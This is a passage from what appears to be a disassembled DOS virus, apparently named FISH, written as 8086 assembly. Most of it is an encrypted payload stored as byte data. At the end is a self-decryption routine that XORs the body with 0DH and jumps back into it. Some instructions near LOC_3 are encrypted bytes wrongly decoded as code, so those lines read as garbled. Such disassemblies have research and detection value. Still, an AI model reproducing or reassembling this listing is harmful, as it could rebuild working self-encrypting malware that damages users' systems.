                DB       05H,0CAH, 4BH,0F1H, 0DH, 0DH
                DB      0E4H, 20H,0F7H, 78H, 05H, 36H
                DB      0CCH, 7AH, 09H, 23H,0AEH,0A2H
                DB       03H, 23H, 86H, 03H,0AAH, 03H
                DB       23H, 86H, 1BH,0A8H, 03H, 06H
                DB      0C4H, 78H, 08H, 8EH,0F7H, 11H
                DB       7BH, 17H, 23H, 86H, 1BH,0A0H
                DB       03H,0B9H, 32H, 23H, 86H, 03H
                DB      0A2H, 03H,0E5H, 48H,0F8H, 23H
                DB       0EH, 0BH,0BCH, 03H, 84H, 4BH
                DB      0F1H,0E4H, 97H,0F5H, 84H,0DAH
                DB       84H,0DBH, 23H, 0EH, 33H,0A2H
                DB       03H, 8EH,0F2H, 11H, 7FH, 05H
                DB       3EH,0F2H,0E6H, 04H, 59H, 58H
                DB       43H, 4CH, 8EH,0E2H, 11H,0FAH
                DB      0D2H, 86H,0CFH, 23H, 86H, 1BH
                DB      0A4H, 03H, 23H, 86H, 03H,0A6H
                DB       03H, 8EH,0CFH, 02H, 8EH,0DCH
                DB       0DH, 8EH,0EFH,0FDH, 8CH,0E7H
                DB      0F1H, 00H, 8EH,0D4H, 0DH, 0CH
                DB      0CFH, 8EH,0DCH, 0DH,0B5H, 0DH
                DB       4FH,0E5H,0F5H,0F9H,0B4H, 11H
                DB       0DH, 24H,0F4H, 24H,0FCH,0B9H
                DB       32H, 23H, 86H, 1BH,0A0H, 03H
                DB      0E5H,0EAH,0F9H, 23H, 0CH, 0BH
                DB      0A0H, 03H, 23H, 24H, 0BH,0A2H
                DB       03H, 23H, 0CH, 0BH,0BCH, 03H
                DB       3EH,0C4H,0B5H, 0DH, 4FH,0B7H
                DB       11H, 0DH,0E5H,0C0H,0F9H,0E4H
                DB       7BH,0F2H, 23H, 2CH, 2BH, 3CH
                DB       03H,0E4H, 35H, 0CH, 23H, 8EH
                DB       2BH,0BEH, 03H,0F3H,0E5H,0DAH
                DB      0F9H,0E5H,0BBH,0F9H,0E5H,0B3H
                DB      0F9H, 7EH, 04H, 23H, 8EH, 03H
                DB      0BEH, 03H, 0CH,0E4H, 05H,0F5H
                DB      0E5H, 94H,0F4H,0FBH, 4AH, 14H
                DB       8DH, 78H, 0EH,0E4H,0F1H,0FAH
                DB       8CH, 62H, 17H, 0DH, 03H, 8EH
                DB       52H, 11H
                DB       0DH, 8DH, 62H
LOC_3:
                ADC     AL,0C5H
                IN      AL,0E1H                                 ; port 0E1H, Memory encode reg1
                CLI                                             ; Disable interrupts
                OUT     83H,AL                                  ; port 83H, DMA page reg ch 1
                OR      CX,[BX+SI+3]
                OR      DX,[BP+SI]
                DB      0F3H, 03H, 0EH, 0DH, 81H,0D7H
                DB       47H, 83H,0D7H,0ACH, 0EH, 0DH
                DB      0F3H,0C1H, 0CH,0CFH,0AEH, 0EH
                DB       0DH, 52H, 4FH, 83H,0CFH, 03H
                DB       12H,0E5H,0D2H, 0DH,0ACH,0B3H
                DB      0F3H, 02H,0B4H, 0DH, 05H, 84H
                DB      0FAH,0F0H,0FEH,0A8H,0F1H, 0BH
                DB      0B5H,0D0H, 0CH, 5DH, 23H, 83H
                DB       0BH, 48H, 03H,0C6H, 23H,0CBH
                DB       0BH,0D7H, 03H, 0DH,0E5H,0AEH
                DB      0F9H, 03H,0E5H, 77H,0F2H, 85H
                DB      0BDH, 1EH, 12H,0E5H,0F1H,0F9H
                DB       81H, 0BH, 22H, 03H, 84H, 13H
                DB       20H, 03H, 81H, 0BH, 36H, 03H
                DB      0BFH, 0FH, 84H, 13H, 34H, 03H
                DB       85H, 1BH, 5DH, 03H,0E5H,0CFH
                DB      0F9H, 84H, 2BH,0D2H, 03H, 81H
                DB       1BH,0D0H, 03H, 03H,0B5H, 24H
                DB       01H, 5DH,0B5H, 7DH, 0DH,0B4H
                DB      0F2H,0F2H, 83H,0CDH, 3EH,0F2H
                DB      0BDH,0C6H,0FFH,0A3H, 42H, 91H
                DB       0BH, 5AH, 91H, 55H, 8DH,0C1H
                DB       0CH, 5DH, 90H, 3EH,0CDH,0F2H
                DB       23H, 20H, 03H, 03H, 12H,0E5H
                DB       64H, 0DH, 81H,0BDH, 1EH,0B7H
                DB       9DH, 00H,0E5H, 9EH,0F9H,0BDH
                DB       29H,0E5H,0A9H,0F9H, 84H, 13H
                DB       30H, 03H,0B7H,0C8H, 00H,0BDH
                DB       29H, 81H, 0BH, 32H, 03H,0E5H
                DB       73H,0F9H,0E5H, 05H,0F9H,0CEH
                DB      0E5H, 24H,0F9H, 23H,0C8H, 1BH
                DB       34H, 03H,0BDH, 1EH,0E5H, 60H
                DB      0F9H, 23H,0C8H, 1BH, 30H, 03H
                DB      0BDH, 29H,0E5H, 6EH,0F9H,0E5H
                DB      0E0H,0FEH,0CEH, 58H, 84H,0E8H
                DB       8CH, 6BH, 0BH,0F2H,0F3H,0F2H
                DB       4BH, 17H, 50H,0C2H, 23H,0CAH
                DB       0BH, 5DH, 03H, 0CH, 09H,0E5H
                DB       30H,0F9H,0E5H,0B7H,0FEH, 5DH
                DB       23H,0ACH,0BEH, 03H, 00H, 0DH
                DB       0CH, 5DH, 90H, 55H, 50H, 23H
                DB      0F2H, 23H, 38H, 03H, 84H,0E5H
                DB       9FH,0FEH,0BDH, 0CH,0B7H, 66H
                DB       01H, 03H, 12H,0E5H, 2BH,0F9H
                DB       91H, 55H, 00H, 0DH, 0CH, 5DH
                DB       90H, 4DH,0FAH,0EDH, 3AH,0AEH
                DB       3CH, 03H,0E5H, 87H,0FEH,0CEH
                DB      0F2H, 58H, 84H,0E8H, 5DH, 8CH
                DB       73H, 09H, 0DH,0CDH, 7EH, 01H
                DB       23H,0ACH, 4AH, 03H, 34H, 4BH
                DB       09H, 7BH, 0EH, 55H, 50H,0C2H
                DB       23H, 8DH, 33H, 5DH, 03H, 0CH
                DB       79H, 2BH, 86H, 4BH, 09H, 23H
                DB      0AEH, 22H, 03H, 86H, 4BH, 0FH
                DB       23H,0AEH, 20H, 03H, 7FH, 02H
                DB       55H, 50H, 23H, 86H, 2BH,0D2H
                DB       03H, 23H, 83H, 1BH,0D0H, 03H
                DB      0E4H, 39H,0F2H, 8CH, 6BH, 0BH
                DB      0F2H,0F3H,0E6H,0C2H, 23H,0F3H
                DB       03H, 5CH, 03H, 78H,0C5H, 8CH
                DB       6BH, 0BH,0F2H,0F3H,0E5H, 7CH
                DB      0FEH,0E5H, 13H,0FEH,0B9H, 21H
                DB      0E5H, 03H,0FEH, 23H, 85H, 1BH
                DB       5CH, 00H, 23H, 85H, 1BH, 63H
                DB       00H, 8DH,0E1H, 0FH,0E5H,0F3H
                DB      0FFH, 0FH,0FFH
DATA_4          DD      893B8523H
                DB       00H, 23H, 85H, 3BH,0D1H, 00H
                DB      0BDH, 0EH,0E5H,0A1H,0FEH, 0BH
                DB       12H, 84H,0D7H,0BDH, 0CH,0E5H
                DB       80H,0FEH,0E5H,0F2H,0FFH,0E5H
                DB       52H,0FEH,0E5H, 1CH,0FEH, 5EH
                DB       5CH,0B6H, 25H, 0DH,0B4H, 8AH
                DB       0FH, 23H, 8DH, 3AH, 10H, 8EH
                DB      0CEH, 08H,0EFH,0FAH, 54H, 56H
                DB      0E6H, 97H, 23H, 8DH, 03H, 25H
                DB       0DH, 0DH, 79H, 1EH, 5EH, 5CH
                DB      0B6H, 25H, 0DH,0B4H, 8AH, 0FH
                DB       23H, 8DH, 3AH, 10H, 8EH,0CEH
                DB       08H,0EFH,0FAH, 54H, 56H,0E4H
                DB      0FEH,0F9H, 5CH, 5EH,0B6H, 25H
                DB       0DH,0B4H, 55H, 0DH, 2EH, 80H
                DB       37H, 0DH, 43H,0E2H,0F9H, 5BH
                DB       59H,0E8H, 94H,0F2H,0EBH, 3FH
                DB      0B8H, 2EH, 8FH, 06H, 41H, 0EH
                DB       2EH, 8FH, 06H, 43H, 0EH, 2EH
                DB       8FH, 06H,0DBH, 0EH, 2EH, 83H
                DB       26H,0DBH, 0EH,0FEH, 2EH, 80H
                DB       3EH,0DAH, 0EH, 00H, 75H, 11H
                DB       2EH,0FFH, 36H,0DBH, 0EH, 2EH
                DB      0FFH, 1EH, 2DH, 0EH, 73H, 06H
                DB       2EH,0FEH, 06H,0DAH, 0EH,0F9H
                DB       2EH,0FFH, 2EH, 41H, 0EH, 89H
                DB       32H,0C0H, 2EH,0C6H, 06H,0DAH
                DB       0EH, 01H,0CFH
LOC_4:
                CALL    SUB_1                                   ; (0EE1)
  
FISH            ENDP
  
;==========================================================================
;                              SUBROUTINE
;==========================================================================
  
SUB_1           PROC    NEAR
                POP     BX
                SUB     BX,0DA9H
                MOV     CX,0D58H
  
LOCLOOP_5:
                XOR     BYTE PTR CS:[BX],0DH
                INC     BX
                LOOP    LOCLOOP_5                               ; Loop if cx > 0
  
                DEC     BYTE PTR CS:DATA_1E[BX]                 ; (97E0:00B3=0)
                JZ      LOC_RET_6                               ; Jump if zero
                JMP     LOC_2                                   ; (035A)
  
LOC_RET_6:
                RETN
SUB_1           ENDP
  
                AND     [BP+49H],AL
                PUSH    BX
                DEC     AX
                AND     [BP],AL
  
SEG_A           ENDS
  
  
  
                END     START
